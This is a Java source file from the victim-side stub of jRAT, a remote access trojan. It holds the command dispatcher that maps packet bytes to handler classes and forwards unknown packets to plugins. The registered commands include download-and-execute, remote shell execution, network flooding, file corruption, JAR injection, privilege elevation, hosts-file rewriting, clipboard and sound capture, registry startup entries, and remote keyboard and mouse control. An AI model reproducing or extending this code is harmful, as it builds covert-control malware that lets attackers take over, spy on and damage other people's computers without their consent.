package se.jrat.stub.packets.incoming;

import java.util.HashMap;
import java.util.Set;

import se.jrat.common.PacketRange;
import se.jrat.common.exceptions.PacketException;
import se.jrat.stub.Plugin;


public abstract class AbstractIncomingPacket {

	public static final HashMap<Byte, Class<? extends AbstractIncomingPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractIncomingPacket>>();

	static {
		incomingPackets.clear();
		incomingPackets.put((byte) 0, Packet0Ping.class);
		incomingPackets.put((byte) 10, Packet10Messagebox.class);
		incomingPackets.put((byte) 11, Packet11Disconnect.class);
		incomingPackets.put((byte) 12, Packet12RemoteScreen.class);
		// 13
		incomingPackets.put((byte) 14, Packet14VisitURL.class);
		incomingPackets.put((byte) 15, Packet15ListFiles.class);
		incomingPackets.put((byte) 16, Packet16DeleteFile.class);
		incomingPackets.put((byte) 17, Packet17DownloadExecute.class);
		incomingPackets.put((byte) 18, Packet18Update.class);
		incomingPackets.put((byte) 19, Packet19ListProcesses.class);
		incomingPackets.put((byte) 20, Packet20KillProcess.class);
		incomingPackets.put((byte) 21, Packet21ClientUploadFile.class);
		incomingPackets.put((byte) 22, Packet22Flood.class);
		incomingPackets.put((byte) 23, Packet23RemoteShellStart.class);
		incomingPackets.put((byte) 24, Packet24RemoteShellStop.class);
		incomingPackets.put((byte) 25, Packet25RemoteShellExecute.class);
		incomingPackets.put((byte) 26, Packet26StopRemoteScreen.class);
		// 27
		incomingPackets.put((byte) 28, Packet28ShutdownComputer.class);
		incomingPackets.put((byte) 29, Packet29RestartComputer.class);
		incomingPackets.put((byte) 30, Packet30LogoutComputer.class);
		incomingPackets.put((byte) 31, Packet31ComputerSleep.class);
		incomingPackets.put((byte) 32, Packet32LockComputer.class);
		incomingPackets.put((byte) 33, Packet33UsedMemory.class);
		incomingPackets.put((byte) 34, Packet34AdvancedDownload.class);
		incomingPackets.put((byte) 35, Packet35Script.class);
		incomingPackets.put((byte) 36, Packet36Uninstall.class);
		incomingPackets.put((byte) 37, Packet37RestartJavaProcess.class);
		incomingPackets.put((byte) 38, Packet38RunCommand.class);
		incomingPackets.put((byte) 39, Packet39VisitManyURLs.class);
		incomingPackets.put((byte) 40, Packet40Thumbnail.class);
		incomingPackets.put((byte) 41, Packet41SpecialDirectory.class);
		incomingPackets.put((byte) 42, Packet42ClientDownloadFile.class);
		incomingPackets.put((byte) 43, Packet43CreateDirectory.class);
		incomingPackets.put((byte) 44, Packet44PlaySoundFromURL.class);
		incomingPackets.put((byte) 45, Packet45Reconnect.class);
		incomingPackets.put((byte) 46, Packet46CrazyMouse.class);
		incomingPackets.put((byte) 47, Packet47RenameFile.class);
		incomingPackets.put((byte) 48, Packet48ChatStart.class);
		incomingPackets.put((byte) 49, Packet49ChatEnd.class);
		incomingPackets.put((byte) 50, Packet50UpdateRemoteScreen.class);
		incomingPackets.put((byte) 51, Packet51ChatMessage.class);
		// 52
		incomingPackets.put((byte) 53, Packet53StartSearch.class);
		incomingPackets.put((byte) 54, Packet54StopSearch.class);
		incomingPackets.put((byte) 55, Packet55HostsFile.class);
		incomingPackets.put((byte) 56, Packet56UpdateHostsFile.class);
		incomingPackets.put((byte) 57, Packet57UTorrentDownloads.class);
		incomingPackets.put((byte) 58, Packet58NudgeChat.class);
		incomingPackets.put((byte) 59, Packet59Clipboard.class);
		incomingPackets.put((byte) 60, Packet60PreviewFile.class);
		incomingPackets.put((byte) 61, Packet61SystemJavaProperties.class);
		incomingPackets.put((byte) 62, Packet62PreviewImage.class);
		incomingPackets.put((byte) 63, Packet63PreviewArchive.class);
		incomingPackets.put((byte) 64, Packet64FileHash.class);
		incomingPackets.put((byte) 65, Packet65Beep.class);
		incomingPackets.put((byte) 66, Packet66PianoNote.class);
		incomingPackets.put((byte) 67, Packet67LongPianoNote.class);
		// 68
		incomingPackets.put((byte) 69, Packet69Print.class);
		incomingPackets.put((byte) 70, Packet70CorruptFile.class);
		incomingPackets.put((byte) 71, Packet71LocalNetworkDevices.class);
		incomingPackets.put((byte) 72, Packet72IPConfig.class);
		incomingPackets.put((byte) 73, Packet73ActivePorts.class);
		incomingPackets.put((byte) 74, Packet74GarbageCollect.class);
		incomingPackets.put((byte) 75, Packet75AllThumbnails.class);
		incomingPackets.put((byte) 76, Packet76Speech.class);
		incomingPackets.put((byte) 77, Packet77ListServices.class);
		incomingPackets.put((byte) 78, Packet78RegistryStartup.class);
		incomingPackets.put((byte) 79, Packet79BrowseRegistry.class);
		incomingPackets.put((byte) 80, Packet80CustomRegQuery.class);
		incomingPackets.put((byte) 81, Packet81InstalledPrograms.class);
		incomingPackets.put((byte) 82, Packet82NetworkAdapters.class);
		// 83
		incomingPackets.put((byte) 84, Packet84SoundCapture.class);
		incomingPackets.put((byte) 85, Packet85ThumbnailPreview.class);
		incomingPackets.put((byte) 86, Packet86ErrorLog.class);
		incomingPackets.put((byte) 87, Packet87DeleteErrorLog.class);
		incomingPackets.put((byte) 88, Packet88StubConfig.class);
		incomingPackets.put((byte) 89, Packet89LoadedPlugins.class);
		incomingPackets.put((byte) 90, Packet90SystemProperties.class);
		incomingPackets.put((byte) 91, Packet91MouseMove.class);
		incomingPackets.put((byte) 92, Packet92MousePress.class);
		incomingPackets.put((byte) 93, Packet93MouseRelease.class);
		incomingPackets.put((byte) 94, Packet94KeyPress.class);
		incomingPackets.put((byte) 95, Packet95KeyRelease.class);
		incomingPackets.put((byte) 96, Packet96EnvironmentVariables.class);
		// 97
		incomingPackets.put((byte) 98, Packet98InjectJAR.class);
		// 99
		incomingPackets.put((byte) 100, Packet100RequestElevation.class);
		incomingPackets.put((byte) 101, Packet101TransferPlugin.class);
		incomingPackets.put((byte) 102, Packet102PauseClientDownload.class);
		incomingPackets.put((byte) 103, Packet103CompleteClientDownload.class);
		incomingPackets.put((byte) 104, Packet104ClientDownloadPart.class);
		incomingPackets.put((byte) 105, Packet105CancelClientUpload.class);
	}

	public static final void execute(byte header) {
		try {
			AbstractIncomingPacket packet = null;
			Set<Byte> set = incomingPackets.keySet();
			for (byte b : set) {
				if (b == header) {
					packet = incomingPackets.get(b).newInstance();
					break;
				}
			}
			
			if (packet != null && header >= 0 && header <= PacketRange.RANGE_STUB_INCOMING) {
				packet.read();
			} else {
				for (Plugin p : Plugin.list) {
					p.methods.get("onpacket").invoke(p.instance, new Object[] { header });
				}
			}
		} catch (Exception ex) {
			PacketException ex1 = new PacketException("Failed to handle packet " + header, ex);
			ex1.printStackTrace();
		}
	}

	public abstract void read() throws Exception;

}
